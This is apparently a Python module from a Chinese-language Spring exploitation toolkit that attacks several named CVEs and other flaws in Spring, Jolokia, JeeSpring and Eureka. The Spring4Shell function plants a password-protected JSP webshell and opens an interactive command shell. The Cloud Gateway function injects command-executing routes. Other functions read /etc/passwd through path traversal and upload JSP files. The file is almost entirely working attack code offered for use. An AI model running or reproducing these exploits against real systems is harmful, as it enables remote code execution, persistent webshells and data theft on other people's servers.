#!/usr/bin/env python
# coding=utf-8

import requests, sys, json, re, random, base64
from termcolor import cprint
from time import sleep
import urllib3
urllib3.disable_warnings()

ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (X11; NetBSD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36",
      "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36",
      "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
      "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0",
      "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00"]

def CVE_2022_22965(url, proxies):
    cprint("======开始对目标URL进行CVE-2022-22965漏洞利用======", "green")
    Headers_1 = {
        "User-Agent": random.choice(ua),
        "suffix": "%>//",
        "c1": "Runtime",
        "c2": "<%",
        "DNT": "1",
        "Content-Type": "application/x-www-form-urlencoded"
        }
    payload_linux = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22aabysszg%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22bash%22,%22-c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
    payload_win = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22aabysszg%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22cmd%22,%22/c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
    payload_http = """?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22aabysszg%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
    data1 = payload_linux
    data2 = payload_win
    getpayload = url + payload_http
    try:
        requests.packages.urllib3.disable_warnings()
        requests.post(url, headers=Headers_1, data=data1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
        sleep(0.5)
        requests.post(url, headers=Headers_1, data=data2, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
        sleep(0.5)
        requests.get(getpayload, headers=Headers_1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
        sleep(0.5)
        test = requests.get(url + "tomcatwar.jsp", verify=False, proxies=proxies)
        if (test.status_code == 200) and ('aabysszg' in str(test.text)):
            cprint("[+] 存在编号为CVE-2022-22965的RCE漏洞，上传Webshell为：" + url + "tomcatwar.jsp?pwd=aabysszg&cmd=whoami" ,"red")
            while 1:
                Cmd = input("[+] 请输入要执行的命令>>> ")
                if Cmd == "exit":
                    sys.exit(0)
                url_shell = url + "tomcatwar.jsp?pwd=aabysszg&cmd={}".format(Cmd)
                r = requests.get(url_shell, verify=False, proxies=proxies)
                resp = r.text
                result = re.findall('([^\x00]+)\n', resp)[0]
                cprint(result ,"green")
        else:
            cprint("[-] CVE-2022-22965漏洞不存在或者已经被利用,shell地址请手动尝试访问：\n[/tomcatwar.jsp?pwd=aabysszg&cmd=命令] \n","yellow")
    except KeyboardInterrupt:
        print("Ctrl + C 手动终止了进程")
        sys.exit()
    except Exception as e:
        print("[-] 发生错误，已记入日志error.log\n")
        f2 = open("error.log", "a")
        f2.write(str(e) + '\n')
        f2.close()

def CVE_2022_22963(url, proxies):
    cprint("======开始对目标URL进行CVE-2022-22963漏洞利用======", "green")
    payload = f'T(java.lang.Runtime).getRuntime().exec("whoami")'

    data = 'test'
    header = {
        'spring.cloud.function.routing-expression': payload,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': random.choice(ua),
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    path = 'functionRouter'
    
    try:
        url = url + path
        requests.packages.urllib3.disable_warnings()
        req = requests.post(url=url, headers=header, data=data, verify=False, proxies=proxies, timeout=6)
        code = req.status_code
        text = req.text
        rsp = '"error":"Internal Server Error"'
        if code == 500 and rsp in text:
            cprint(f'[+] {url} 存在编号为CVE-2022-22963的RCE漏洞，请手动反弹Shell', "red")
            print('\n')
        else:
            cprint("[-] CVE-2022-22963漏洞不存在\n", "yellow")
    except KeyboardInterrupt:
        print("Ctrl + C 手动终止了进程")
        sys.exit()
    except Exception as e:
        print("[-] 发生错误，已记入日志error.log\n")
        f2 = open("error.log", "a")
        f2.write(str(e) + '\n')
        f2.close()

def CVE_2022_22947(url, proxies):
    cprint("======开始对目标URL进行CVE-2022-22947漏洞利用======","green")
    headers1 = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': random.choice(ua),
        'Content-Type': 'application/json'
    }

    headers2 = {
        'User-Agent': random.choice(ua),
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    payload = '''{\r
              "id": "hacktest",\r
              "filters": [{\r
                "name": "AddResponseHeader",\r
                "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"id\\"}).getInputStream()))}"}\r
                }],\r
              "uri": "http://example.com",\r
              "order": 0\r
            }'''

    payload2 = '''{\r
              "id": "hacktest",\r
              "filters": [{\r
                "name": "AddResponseHeader",\r
                "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"whoami\\"}).getInputStream()))}"}\r
                }],\r
              "uri": "http://example.com",\r
              "order": 0\r
            }'''

    try:
        requests.packages.urllib3.disable_warnings()
        re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload, headers=headers1, json=json ,verify=False, proxies=proxies)
        re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False, proxies=proxies)
        re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
        if ('uid=' in str(re3.text)) and ('gid=' in str(re3.text)) and ('groups=' in str(re3.text)):
            cprint("[+] Payload已经输出，回显结果如下：", "red")
            print('\n')
            print(re3.text)
            print('\n')
            print("[+] 执行命令模块（输入exit退出）")
            while 1:
                Cmd = input("[+] 请输入要执行的命令>>> ")
                if Cmd == "exit":
                    re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
                    re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False, proxies=proxies)
                    sys.exit(0)
                else:
                    payload3 = payload2.replace('whoami', Cmd)
                    re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload3, headers=headers1, json=json ,verify=False, proxies=proxies)
                    re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False, proxies=proxies)
                    re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
                    result = re3.text
                    cprint(result ,"green")
                    print('\n')
        else:
            cprint("[-] CVE-2022-22947漏洞不存在\n", "yellow")
    except KeyboardInterrupt:
        print("Ctrl + C 手动终止了进程")
        sys.exit()
    except Exception as e:
        print("[-] 发生错误，已记入日志error.log\n")
        f2 = open("error.log", "a")
        f2.write(str(e) + '\n')
        f2.close()

def JeeSpring_2023(url,proxies):
    cprint("======开始对目标URL进行2023JeeSpring任意文件上传漏洞利用======","green")
    headers1 = {
        'User-Agent': random.choice(ua),
        'Content-Type': 'multipart/form-data;boundary=----WebKitFormBoundarycdUKYcs7WlAxx9UL',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apn g,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'zh-CN,zh;q=0.9,ja;q=0.8',
        'Connection': 'close'
    }

    payload2 = b'LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5Y2RVS1ljczdXbEF4eDlVTA0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJmaWxlIjsgZmlsZW5hbWU9ImxvZy5qc3AiDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbQ0KDQo8JSBvdXQucHJpbnRsbigiSGVsbG8gV29ybGQiKTsgJT4NCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeWNkVUtZY3M3V2xBeHg5VUwtLQo='
    payload = base64.b64decode(payload2)
    path = 'static/uploadify/uploadFile.jsp?uploadPath=/static/uploadify/'
    
    try:
        requests.packages.urllib3.disable_warnings()
        re1 = requests.post(url=url + path, data=payload, headers=headers1, verify=False, proxies=proxies)
        code1 = re1.status_code
        if ('jsp' in str(re1.text)) and (int(code1) == 200):
            cprint("[+] Payload已经发送，成功上传JSP", "red")
            newpath = str(re1.text)
            urltest = url + "static/uploadify/" + newpath.strip()
            retest = requests.get(url=urltest, verify=False, proxies=proxies)
            code2 = retest.status_code
            if ('Hello' in str(retest.text)) and (code2 == 200):
                cprint(f'[+] {url} 存在2023JeeSpring任意文件上传漏洞，Poc地址如下：', "red")
                cprint(urltest + '\n', "red")
            else:
                cprint(f'[.] 未发现Poc存活，请手动验证： {urltest}', "yellow")
        else:
            cprint("[-] 2023JeeSpring任意文件上传漏洞不存在\n", "yellow")
    except KeyboardInterrupt:
        print("Ctrl + C 手动终止了进程")
        sys.exit()
    except Exception as e:
        print("[-] 发生错误，已记入日志error.log\n")
        f2 = open("error.log", "a")
        f2.write(str(e) + '\n')
        f2.close()

def JolokiaRCE(url,proxies):
    cprint("======开始对目标URL进行Jolokia系列RCE漏洞测试======","green")
    path1 = 'jolokia'
    path2 = 'actuator/jolokia'
    path3 = 'jolokia/list'
    
    try:
        requests.packages.urllib3.disable_warnings()
        re1 = requests.post(url=url + path1, timeout=10, allow_redirects=False, verify=False, proxies=proxies)
        code1 = re1.status_code
        re2 = requests.post(url=url + path2, timeout=10, allow_redirects=False, verify=False, proxies=proxies)
        code2 = re2.status_code
        if ((int(code1) == 200) or (int(code2) == 200)):
            cprint("[+] 发现jolokia相关路径状态码为200，进一步验证", "red")
            retest = requests.get(url=url + path3, timeout=10, verify=False, proxies=proxies)
            code3 = retest.status_code
            if ('reloadByURL' in str(retest.text)) and (code3 == 200):
                cprint(f'[+] {url} 存在Jolokia-Logback-JNDI-RCE漏洞，Poc地址如下：', "red")
                cprint(url + path3 + '\n', "red")
            elif ('createJNDIRealm' in str(retest.text)) and (code3 == 200):
                cprint(f'[+] {url} 存在Jolokia-Realm-JNDI-RCE漏洞，Poc地址如下：', "red")
                cprint(url + path3 + '\n', "red")
            else:
                cprint(f'[.] 未发现jolokia/list路径存在关键词，请手动验证：', "yellow")
                cprint(url + path3 + '\n', "red")
        else:
            cprint("[-] Jolokia系列RCE漏洞不存在\n", "yellow")
    except KeyboardInterrupt:
        print("Ctrl + C 手动终止了进程")
        sys.exit()
    except Exception as e:
        print("[-] 发生错误，已记入日志error.log\n")
        f2 = open("error.log", "a")
        f2.write(str(e) + '\n')
        f2.close()

def CVE_2021_21234(url,proxies):
    cprint("======开始对目标URL进行CVE-2021-21234漏洞测试======","green")
    payload1 = 'manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../'
    payload2 = 'log/view?filename=/windows/win.ini&base=../../../../../../../../../../'
    payload3 = 'manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../'
    payload4 = 'log/view?filename=/etc/passwd&base=../../../../../../../../../../'

    try:
        requests.packages.urllib3.disable_warnings()
        re1 = requests.post(url=url + payload1, verify=False, proxies=proxies)
        re2 = requests.post(url=url + payload2, verify=False, proxies=proxies)
        re3 = requests.post(url=url + payload3, verify=False, proxies=proxies)
        re4 = requests.post(url=url + payload4, verify=False, proxies=proxies)
        if (('MAPI' in str(re1.text)) or ('MAPI' in str(re2.text))):
            cprint("[+] 发现Spring Boot目录遍历漏洞且系统为Win，Poc路径如下：", "red")
            cprint(url + payload1, "red")
            cprint(url + payload2 + '\n', "red")
        elif (('root:x:' in str(re3.text)) or ('root:x:' in str(re4.text))):
            cprint(f'[+] 发现Spring Boot目录遍历漏洞且系统为Linux，Poc路径如下：', "red")
            cprint(url + payload3, "red")
            cprint(url + payload4 + '\n', "red")
        else:
            cprint("[-] 未发现Spring Boot目录遍历漏洞\n", "yellow")
    except KeyboardInterrupt:
        print("Ctrl + C 手动终止了进程")
        sys.exit()
    except Exception as e:
        print("[-] 发生错误，已记入日志error.log\n")
        f2 = open("error.log", "a")
        f2.write(str(e) + '\n')
        f2.close()

def SnakeYAML_RCE(url,proxies):
    cprint("======开始对目标URL进行SnakeYAML RCE漏洞测试======","green")
    Headers_1 = {
        "User-Agent": random.choice(ua),
        "Content-Type": "application/x-www-form-urlencoded"
        }
    Headers_2 = {
        "User-Agent": random.choice(ua),
        "Content-Type": "application/json"
        }
    payload_1 = "spring.cloud.bootstrap.location=http://127.0.0.1/example.yml"
    payload_2 = "{\"name\":\"spring.main.sources\",\"value\":\"http://127.0.0.1/example.yml\"}"
    path = 'env'
    
    try:
        requests.packages.urllib3.disable_warnings()
        urltest = url + path
        re1 = requests.post(url=urltest, headers=Headers_1, data=payload_1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
        re2 = requests.post(url=urltest, headers=Headers_2, data=payload_2, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
        if ('example.yml' in str(re1.text)):
            cprint("[+] 发现SnakeYAML-RCE漏洞，Poc为Spring 1.x：", "red")
            cprint('漏洞存在路径为 ' + urltest + '\n', "red")
            cprint('POST数据包内容为 ' + payload_1 + '\n', "red")
        elif ('example.yml' in str(re2.text)):
            cprint("[+] 发现SnakeYAML-RCE漏洞，Poc为Spring 2.x：", "red")
            cprint('漏洞存在路径为 ' + urltest + '\n', "red")
            cprint('POST数据包内容为 ' + payload_2 + '\n', "red")
        else:
            cprint("[-] 未发现SnakeYAML-RCE漏洞\n", "yellow")
    except KeyboardInterrupt:
        print("Ctrl + C 手动终止了进程")
        sys.exit()
    except Exception as e:
        print("[-] 发生错误，已记入日志error.log\n")
        f2 = open("error.log", "a")
        f2.write(str(e) + '\n')
        f2.close()

def Eureka_xstream_RCE(url,proxies):
    cprint("======开始对目标URL进行Eureka_Xstream反序列化漏洞测试======","green")
    Headers_1 = {
        "User-Agent": random.choice(ua),
        "Content-Type": "application/x-www-form-urlencoded"
        }
    Headers_2 = {
        "User-Agent": random.choice(ua),
        "Content-Type": "application/json"
        }
    payload_1 = "eureka.client.serviceUrl.defaultZone=http://127.0.0.2/example.yml"
    payload_2 = "{\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://127.0.0.2/example.yml\"}"
    path1 = 'env'
    path2 = 'actuator/env'
    
    try:
        requests.packages.urllib3.disable_warnings()
        urltest1 = url + path1
        urltest2 = url + path2
        re1 = requests.post(url=urltest1, headers=Headers_1, data=payload_1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
        re2 = requests.post(url=urltest2, headers=Headers_2, data=payload_2, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
        if ('127.0.0.2' in str(re1.text)):
            cprint("[+] 发现Eureka_Xstream反序列化漏洞，Poc为Spring 1.x：", "red")
            cprint('漏洞存在路径为 ' + urltest1 + '\n', "red")
            cprint('POST数据包内容为 ' + payload_1 + '\n', "red")
        elif ('127.0.0.2' in str(re2.text)):
            cprint("[+] 发现Eureka_Xstream反序列化漏洞，Poc为Spring 2.x：", "red")
            cprint('漏洞存在路径为 ' + urltest2 + '\n', "red")
            cprint('POST数据包内容为 ' + payload_2 + '\n', "red")
        else:
            cprint("[-] 未发现Eureka_Xstream反序列化漏洞\n", "yellow")
    except KeyboardInterrupt:
        print("Ctrl + C 手动终止了进程")
        sys.exit()
    except Exception as e:
        print("[-] 发生错误，已记入日志error.log\n")
        f2 = open("error.log", "a")
        f2.write(str(e) + '\n')
        f2.close()

def vul(url,proxies):
    functions = {
        1: CVE_2021_21234,
        2: CVE_2022_22947,
        3: CVE_2022_22963,
        4: CVE_2022_22965,
        5: SnakeYAML_RCE,
        6: JolokiaRCE,
        7: JeeSpring_2023,
        8: Eureka_xstream_RCE,
    }
    cprint("[+] 目前漏洞库内容如下：","green")
    for num, func in functions.items():
        print(f" {num}: {func.__name__}")
    try:
        choices = input("\n请输入要检测的漏洞 (例子：1,3,5 直接回车即检测全部漏洞): ")
        if choices == '':
            choices = "1,2,3,4,5,6,7,8"
        choices = [int(choice) for choice in choices.split(',')]
    except Exception as e:
        print("请不要输入无意义的字符串")
        sys.exit()
    for choice in choices:
        selected_func = functions.get(choice)
        if selected_func:
            selected_func(url, proxies)
        else:
            print(f"{choice} 输入错误，请重新输入漏洞选择模块\n")
            break
    cprint("后续会加入更多漏洞利用模块，请师傅们敬请期待~", "red")
    sys.exit()
